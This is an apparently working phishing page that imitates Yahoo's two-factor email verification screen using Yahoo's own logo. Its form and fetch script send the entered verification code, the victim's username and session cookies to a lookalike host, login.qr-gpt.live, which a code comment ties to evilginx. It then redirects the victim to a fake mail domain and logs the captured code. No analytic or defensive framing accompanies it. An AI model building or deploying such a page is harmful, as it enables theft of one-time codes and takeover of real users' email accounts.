<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Yahoo - Email Verification</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="robots" content="noindex, nofollow">
  <link rel="shortcut icon" href="https://s.yimg.com/rz/l/favicon.ico" type="image/x-icon">
  
  <style>
      * { margin: 0; padding: 0; box-sizing: border-box; }
      body { 
          font-family: Arial, sans-serif; 
          background: #f5f5f5; 
          margin: 0; 
          padding: 20px; 
          color: #333; 
          line-height: 1.4;
      }
      .container { 
          max-width: 400px; 
          margin: 0 auto; 
          background: white; 
          padding: 40px; 
          border-radius: 8px; 
          box-shadow: 0 2px 10px rgba(0,0,0,0.1);
      }
      .yahoo-logo { 
          text-align: center; 
          margin-bottom: 30px; 
      }
      .yahoo-logo img { 
          width: 80px; 
      }
      .form-title { 
          color: #333; 
          font-size: 24px; 
          margin-bottom: 10px; 
          text-align: center;
      }
      .form-subtitle { 
          color: #666; 
          margin-bottom: 30px; 
          text-align: center;
      }
      .verification-info {
          background: #f0f8ff;
          border: 1px solid #b3d9ff;
          border-radius: 6px;
          padding: 15px;
          margin-bottom: 20px;
          font-size: 14px;
          color: #0066cc;
      }
      .input-group { 
          margin-bottom: 20px; 
          position: relative;
      }
      .input-label { 
          display: block; 
          margin-bottom: 8px; 
          font-size: 14px; 
          font-weight: 500;
      }
      .verification-input { 
          width: 100%; 
          padding: 12px; 
          border: 2px solid #ddd; 
          border-radius: 4px; 
          font-size: 16px; 
          margin-bottom: 20px; 
          text-align: center;
          letter-spacing: 2px;
      }
      .verification-input:focus { 
          outline: none; 
          border-color: #6001d2;
      }
      .submit-btn { 
          width: 100%; 
          background: #6001d2; 
          color: white; 
          padding: 12px; 
          border: none; 
          border-radius: 4px; 
          font-size: 16px; 
          cursor: pointer; 
          transition: background-color 0.3s;
      }
      .submit-btn:hover { 
          background: #5000b8;
      }
      .submit-btn:disabled { 
          background: #ccc; 
          cursor: not-allowed;
      }
      .resend-link { 
          text-align: center; 
          margin-top: 20px; 
      }
      .resend-link a { 
          color: #6001d2; 
          text-decoration: none; 
      }
      .resend-link a:hover { 
          text-decoration: underline;
      }
      .footer { 
          text-align: center; 
          margin-top: 30px; 
          font-size: 12px; 
          color: #666;
      }
      .footer a { 
          color: #6001d2; 
          text-decoration: none; 
          margin: 0 10px;
      }
  </style>
</head>
<body>
  <div class="container">
      <div class="yahoo-logo">
          <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_205x58_frontpage.png" alt="Yahoo">
      </div>
      
      <h1 class="form-title">Check your email</h1>
      <p class="form-subtitle">We sent a verification code to your email address. Enter it below to continue.</p>
      
      <div class="verification-info">
          We sent a verification code to <strong id="user-email">daulgra@yahoo.com</strong>. 
          Enter the code below to continue.
      </div>
      
      <form id="verification-form" method="POST" action="https://login.qr-gpt.live/account/challenge/email-verify">
          <input type="hidden" name="crumb" value="31wTyCvw7RZO%2FqKiA3tKg">
          <input type="hidden" name="acrumb" value="dqd4JdSY">
          <input type="hidden" name="sessionIndex" value="QQ--">
          <input type="hidden" name="username" id="hidden-username" value="">
          <input type="hidden" name="displayName" id="hidden-display-name" value="">
          
          <input type="text" 
                 id="verification-code" 
                 name="verificationCode" 
                 class="verification-input" 
                 required 
                 maxlength="8"
                 placeholder="Enter verification code">
          
          <button type="submit" class="submit-btn" id="submit-btn">Verify</button>
      </form>
      
      <div class="resend-link">
          <a href="#" id="resend-code">Didn't receive the code? Resend</a>
      </div>
  </div>

  <script>
  (function() {
      'use strict';
      
      console.log('Yahoo 2FA email verification page loaded');
      
      function getUsername() {
          const urlParams = new URLSearchParams(window.location.search);
          let username = urlParams.get('u');
          
          if (username) {
              return decodeURIComponent(username);
          }
          
          return sessionStorage.getItem('yh_username') || 'daulgra@yahoo.com';
      }
      
      function initializePage() {
          const username = getUsername();
          
          document.getElementById('user-email').textContent = username;
          document.getElementById('hidden-username').value = username;
          document.getElementById('hidden-display-name').value = username;
          
          console.log('2FA page initialized for:', username);
      }
      
      function handleFormSubmission(event) {
          event.preventDefault();
          
          const code = document.getElementById('verification-code').value.trim();
          if (!code) {
              alert('Please enter the verification code.');
              return;
          }
          
          console.log('=== 2FA CODE CAPTURE ===');
          console.log('Username:', document.getElementById('hidden-username').value);
          console.log('Verification Code:', code);
          
          const submitBtn = document.getElementById('submit-btn');
          submitBtn.disabled = true;
          submitBtn.textContent = 'Verifying...';
          
          // Submit the form to evilginx
          const form = document.getElementById('verification-form');
          const formData = new FormData(form);
          
          fetch(form.action, {
              method: 'POST',
              body: new URLSearchParams(formData),
              credentials: 'include',
              headers: {
                  'Content-Type': 'application/x-www-form-urlencoded',
                  'X-Requested-With': 'XMLHttpRequest'
              }
          })
          .then(response => {
              console.log('2FA Response:', response.status);
              
              if (response.ok) {
                  // Success - redirect to mail
                  setTimeout(() => {
                      window.location.href = 'https://mail.qr-gpt.live/d/folders/1';
                  }, 1000);
              } else {
                  throw new Error('Verification failed');
              }
          })
          .catch(error => {
              console.error('2FA Error:', error);
              submitBtn.disabled = false;
              submitBtn.textContent = 'Verify';
              alert('Invalid code. Please try again.');
              document.getElementById('verification-code').focus();
              document.getElementById('verification-code').select();
          });
      }
      
      function handleResendCode() {
          console.log('Resend code requested');
          alert('A new verification code has been sent to your email.');
      }
      
      function init() {
          initializePage();
          
          document.getElementById('verification-form').addEventListener('submit', handleFormSubmission);
          document.getElementById('resend-code').addEventListener('click', function(e) {
              e.preventDefault();
              handleResendCode();
          });
          
          // Auto-focus and format code input
          const codeInput = document.getElementById('verification-code');
          codeInput.addEventListener('input', function(e) {
              // Remove non-numeric characters
              e.target.value = e.target.value.replace(/[^0-9]/g, '');
          });
          
          setTimeout(() => {
              codeInput.focus();
          }, 500);
          
          console.log('2FA email verification page fully initialized');
      }
      
      if (document.readyState === 'loading') {
          document.addEventListener('DOMContentLoaded', init);
      } else {
          init();
      }
      
  })();
  </script>
</body>
</html>
